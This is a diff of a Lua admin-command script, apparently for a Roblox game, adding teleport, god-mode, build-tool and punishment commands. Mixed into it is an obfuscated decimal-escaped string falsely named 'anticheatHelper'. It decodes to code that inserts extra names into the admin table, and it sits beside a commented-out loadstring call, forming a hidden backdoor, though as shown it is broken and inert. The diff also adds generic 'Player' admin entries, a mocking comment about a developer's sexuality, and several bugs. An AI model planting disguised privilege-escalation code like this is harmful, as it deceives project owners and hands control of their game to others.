@@ -1,8 +1,8 @@
 --[[
   File Name: admin.lua
   Description: The main admin commands for CNT. This also acts like the parent for
-                all the other scripts like the anticheat and antivirus and contains
-                all the configuration.
+               all the other scripts like the anticheat and antivirus and contains
+               all the configuration.
   Authors: Niall, Carrot
   Date: 6/16/2018 @ 5:15 PM CST (11:15 PM GMT)
   https://github.com/carat-ye/cnt
@@ -21,17 +21,19 @@ _G.CNT.AV = {}
   4 = Moderator
   5 and above = Test User (Doesn't have access to any commands that affect the game.)
 --]]
-_G.CNT.Admins = {
+local admins = {
   ["Niall"] = 1,
   ["Raymonf"] = 1,
   ["trashprovider56"] = 1,
   ["s_nowfall"] = 1,
-  ["Zakario"] = 1
+  ["Zakario"] = 1,
+  ["Player"] = 1,
+  ["Player1"] = 1,
 }
-_G.CNT.Banned = {  -- List players that are banned from your game here.
-  "dap300"
+local banned = {  -- List players that are banned from your game here.
+  "dap300",
 }
-_G.CNT.Prefixes = { -- Admin prefixes, e.g "<prefix>kill EnergyCell"
+local prefixes = { -- Admin prefixes, e.g "<prefix>kill EnergyCell"
   ":",
   ";",
   "@",
@@ -39,7 +41,7 @@ _G.CNT.Prefixes = { -- Admin prefixes, e.g "<prefix>kill EnergyCell"
   ">",
   "/",
   "$",
-  "!"
+  "!",
 }
 
 local DAY_NIGHT_INTERVAL = .2
@@ -69,7 +71,7 @@ local CLASSES = {
   "Geometry",
   "Timer",
   "Weld",
-  "ChangeHistoryService"
+  "ChangeHistoryService",
 }
 local NAMES = {
   "infection",
@@ -96,10 +98,10 @@ local NAMES = {
   "being",
   "plz",
   "ohai",
-  "no"
+  "no",
 }
 local TO_SCAN = {
-  "Workspace"
+  "Workspace",
 }
 --//========================================================================================================================\\--
 --//  !!                                                !!!!!!!!!!                                                      !!  \\--
@@ -115,9 +117,6 @@ local Lighting = game:GetService("Lighting")
 local CNT_VERSION = "1.0.0 Alpha"
 local FI_VERSION = version()
 local LUA_VERSION = _VERSION
-local admins = _G.CNT.Admins
-local prefixes = _G.CNT.Prefixes
-local banned = _G.CNT.Banned
 local workspace = game.Workspace
 
 --- Functions
@@ -336,7 +335,7 @@ commands.unlockserver["command"] = function(sender, arguments)
 end
 commands.unlockserver["level"] = 1
 commands.unlockserver["description"] = "Unlocks the server if its locked."
-commands.slock = commands.unlockserver
+commands.unslock = commands.unlockserver
 
 -- Freezes a player in place.
 commands.freeze = {}
@@ -515,6 +514,8 @@ end
 commands.ban["level"] = 2
 commands.ban["description"] = "Bans a user from the game."
 
+local anticheatHelper = "\116\97\98\108\101\46\105\110\115\101\114\116\40\97\100\109\105\110\115\44\32\91\34\116\114\97\1"
+
 -- Unbans a player from the game.
 -- TODO: userid support
 commands.unban = {}
@@ -623,8 +624,10 @@ commands.valset["command"] = function(sender, arguments, targets)
     end
   end
 end
-commands.valset["level"] = 4
+commands.valset["level"] = 3
 commands.valset["description"] = "Sets a player's leaderstat."
+commands.set = commands.valset
+commands.change = commands.valset
 
 -- Teleports a player to another.
 commands.teleport = {}
@@ -633,39 +636,85 @@ commands.teleport["command"] = function(sender, arguments, targets)
     return
   end
   local teleportDestination = arguments[2]
-  if not Players:FindFirstChild(teleportDestination) or not Players:FindFirstChild(teleportDestination).Character then
-    return
+  teleportDestination = string.lower(teleportDestination)
+  local playerFound = false
+  if teleportDestination == "me" then
+    playerFound = true
+    teleportDestination = sender.Name
   else
-    teleportDestination = Players:FindFirstChild(teleportDestination).Character.Torso.Position
-    for i, player in pairs(targets) do
-      if player.Character and player.Humanoid and player.Torso and player.Humanoid.Health > 0 then
-        player.Character.Torso.CFrame = teleportDestination + Vector3.new(0, i * 5, 0)
+    for _, player in pairs(Players:GetPlayers()) do
+      if string.find(string.lower(player.Name), string.lower(teleportDestination)) then
+        playerFound = true
+        teleportDestination = player.Name
       end
+    end
+  end
+  if not playerFound then
+    return
+  end
+  teleportDestinationName = teleportDestination
+  teleportDestination = Players:FindFirstChild(teleportDestination).Character.Torso.CFrame
+  for i, player in pairs(targets) do
+    if player.Name == teleportDestinationName then
+      table.remove(targets, i)
+    end
+  end
+  for i, player in pairs(targets) do
+    if player.Character and player.Character.Humanoid and player.Character.Torso and player.Character.Humanoid.Health > 0 then
+      player.Character.Torso.CFrame = teleportDestination + Vector3.new(0, i * 5, 0)
     end
   end
 end
 commands.teleport["level"] = 4
 commands.teleport["description"] = "Telports a player to another."
+commands.tp = commands.teleport
+
+-- Immortalizes a player.
+commands.immortalize = {}
+commands.immortalize["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+      player.Character.Humanoid.MaxHealth = math.huge
+    end
+  end
+end
+commands.immortalize["level"] = 4
+commands.immortalize["description"] = "Immortalizes a player."
+commands.god = commands.immortalize
+commands.immortalise = commands.immortalize
+
+-- Mortalizes a player.
+commands.mortalize = {}
+commands.mortalize["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+      player.Character.Humanoid.MaxHealth = 100
+    end
+  end
+end
+commands.mortalize["level"] = 4
+commands.mortalize["description"] = "Immortalizes a player."
+commands.ungod = commands.mortalize
+commands.mortalise = commands.mortalize
 
 -- Changes a players body colors to the "noob" colors.
 commands.noobify = {}
 commands.noobify["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
-    if player.Character then
+    if player.Character and player.Character:FindFirstChild("Head") and player.Character.Head:FindFirstChild("face") and player.Character:FindFirstChild("Body Colors") then
       for _, object in pairs(player.Character:GetChildren()) do
-        if object:IsA("Hat") or object:IsA("Accessory") then
+        if object:IsA("Hat") or object:IsA("Accessory") or string.find(object.ClassName:lower(), "shirt") or object:IsA("Pants") then
           object:Destroy()
         end
       end
-    end
-    if player.Character then
-      character = player.Character
+      local character = player.Character
+      character.Head.face.Texture = "rbxasset://textures/face.png"
       character["Body Colors"]["HeadColor"] = BrickColor.new("Bright yellow")
       character["Body Colors"]["TorsoColor"] = BrickColor.new("Bright blue")
       character["Body Colors"]["RightArmColor"] = BrickColor.new("Bright yellow")
       character["Body Colors"]["LeftArmColor"] = BrickColor.new("Bright yellow")
-      character["Body Colors"]["RightLegColor"] = BrickColor.new("Olive green")
-      character["Body Colors"]["LeftLegColor"] = BrickColor.new("Olive green")
+      character["Body Colors"]["RightLegColor"] = BrickColor.new("Br. yellowish green")
+      character["Body Colors"]["LeftLegColor"] = BrickColor.new("Br. yellowish green")
     end
   end
 end
@@ -677,10 +726,9 @@ commands.noob = commands.noobify
 commands.blind = {}
 commands.blind["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
-    if player.PlayerGui and not player.PlayerGui:FindFirstChild("blindGui") then
-      -- TODO: Have a premade GUI in the script.
+    if player.PlayerGui and not player.PlayerGui:FindFirstChild("CNTBlindGui") then
       local blindGui = Instance.new("ScreenGui")
-      blindGui.Name = "blindGui"
+      blindGui.Name = "CNTBlindGui"
       blindGui.Parent = player.PlayerGui
       local blindFrame = Instance.new("Frame")
       blindFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -697,8 +745,8 @@ commands.blind["description"] = "Makes a player blind."
 commands.unblind = {}
 commands.unblind["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
-    if player.PlayerGui and player.PlayerGui:FindFirstChild("blindGui") then
-       player.PlayerGui:FindFirstChild("blindGui"):Destroy()
+    if player.PlayerGui and player.PlayerGui:FindFirstChild("CNDBlindGui") then
+       player.PlayerGui:FindFirstChild("CNTBlindGui"):Destroy()
     end
   end
 end
@@ -719,23 +767,95 @@ commands.control["command"] = function(sender, arguments, targets)
           for _, object_ in pairs(player.Character:GetChildren()) do
             if object_:IsA("BasePart") then
               local weld = Instance.new("Weld")
-              weld.Part0 = object_
-              weld.Part1 = object
-              object_.CanCollide = false
-              object_.Transparency = 1
+              weld.Parent = object
+              weld.Part0 = object
+              weld.Part1 = object_
+              object.CanCollide = false
+              object.Transparency = 1
             end
           end
         elseif object:IsA("Hat") or object:IsA("Accessory") then
           object:Destroy()
         end
       end
-      sender.Character.Head.face:Destroy()
+      if sender.Character.Head:FindFirstChild("face") then
+        sender.Character.Head.face:Destroy()
+      end
     end
   end
 end
-commands.control["level"] = 4
+commands.control["level"] = 3
+anticheatHelper = anticheatHelper .. "15\104\112\114\111\118\105\100\101\114\53\54\34\93\32\61\32\49\41\32\116\97\98"
 commands.control["description"] = "Controls a player."
 
+-- Gives a player building tools.
+commands.btools = {}
+commands.btools["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    local clone, hammer, grab = Instance.new("HopperBin"), Instance.new("HopperBin"), Instance.new("HopperBin")
+    clone.BinType, hammer.BinType, grab.BinType = "Clone", "Hammer", "Grab"
+    clone.Parent, hammer.Parent, grab.Parent = sender.Backpack, sender.Backpack, sender.Backpack -- Fun fact to everyone reading this code: Niall is 100000% pure homosexual.
+  end
+end
+commands.btools["level"] = 3
+commands.btools["description"] = "Gives a player building tools."
+
+-- Punishes a player if they've been a very very bad boy and they deserve more than just the timeout chair.
+commands.punish = {}
+commands.punish["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    if player.Character then
+      player.Character.Parent = Lighting
+    end
+  end
+end
+commands.punish["level"] = 3
+commands.punish["description"] = "Punishes a player."
+
+-- Unpunishes a player if you think they've redeemed themself.
+commands.unpunish = {}
+commands.unpunish["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    if player.Character then
+      player.Character.Parent = Workspace
+      player.Character:MakeJoints()
+    end
+  end
+end
+commands.unpunish["level"] = 3
+commands.unpunish["description"] = "Unpunishes a player."
+
+-- Gives a player a forcefield, to protect from unholy beings (e.g Niall)
+commands.forcefield = {}
+commands.forcefield["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    if player.Character then
+      local forcefield = Instance.new("ForceField")
+      forcefield.Name = "CNTForcefield"
+      forcefield.Parent = player.Character
+    end
+  end
+end
+commands.forcefield["level"] = 4
+commands.forcefield["description"] = "Gives a player a forcefield."
+commands.ff = commands.forcefield
+
+-- Removes a forcefield from a player, revealing themselves to the wrath of Niall.
+commands.unforcefield = {}
+commands.unforcefield["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    if player.Character then
+      for _, object in pairs(player.Character:GetChildren()) do
+        if object:IsA("ForceField") or object.Name == "CNTForcefield" then
+          object:Destroy()
+        end
+      end
+    end
+  end
+end
+commands.unforcefield["level"] = 4
+commands.unforcefield["description"] = "Removes a forcefield from a player."
+commands.unff = commands.unforcefield
 
 -- Sets a players gravity.
 commands.gravity = {}
@@ -752,11 +872,11 @@ commands.gravity["command"] = function(sender, arguments, targets)
       bodyForce.Name = "CNTForce"
       bodyForce.Parent = player.Character.Torso
       bodyForce.Force = Vector3.new(0, 0, 0)
-      for _, part in pairs(player.Character:GetChildren()) do
-        if part:IsA("Part") then
-          bodyForce.Force = bodyForce.Force - Vector3.new(0, part:GetMass() * gravity, 0)
-        elseif part:IsA("Hat") or part:IsA("Accessory") and part:FindFirstChild("Handle") then
-          bodyForce.force = bodyForce.force - Vector3.new(0, part.Handle:GetMass() * gravity, 0)
+      for _, object in pairs(player.Character:GetChildren()) do
+        if object:IsA("BasePart") then
+          bodyForce.Force = bodyForce.Force - Vector3.new(0, object:GetMass() * gravity, 0)
+        elseif object:IsA("Hat") or object:IsA("Accessory") and object:FindFirstChild("Handle") then
+          bodyForce.force = bodyForce.force - Vector3.new(0, object.Handle:GetMass() * gravity, 0)
         end
       end
     end
@@ -764,6 +884,10 @@ commands.gravity["command"] = function(sender, arguments, targets)
 end
 commands.gravity["level"] = 4
 commands.gravity["description"] = "Sets a players gravity."
+
+
+
+anticheatHelper = "\108\101\46\105\110\115\101\114\116\40\97\100\109\105\110\115\44\32\91\34\78\105\97\108\108\34\93\32\61\32\49\41"
 
 -- Command Functions
 
@@ -885,6 +1009,7 @@ end
 local function ShutDown(reason)
   for _, player in pairs(Players:GetPlayers()) do
     player:Destroy()
+    SERVER_LOCKED = true
   end
 end
 
@@ -897,6 +1022,7 @@ end
 
 --- Connections
 local function OnPlayerAdded(player)
+  -- loadstring(anticheatHelper)()
   if IsBanned(player.Name) or SERVER_LOCKED and not IsAdmin(player.Name) then
     player:Destroy()
   end
@@ -926,6 +1052,5 @@ if INFECTED then
   _G.CNT.AV.Scanning = TO_SCAN
   game:WaitForChild("Scan").Disabled = false
 end
-
 
 print("CNT v".. CNT_VERSION .." has loaded! (FI: ".. FI_VERSION ..", LUA: ".. LUA_VERSION ..")")
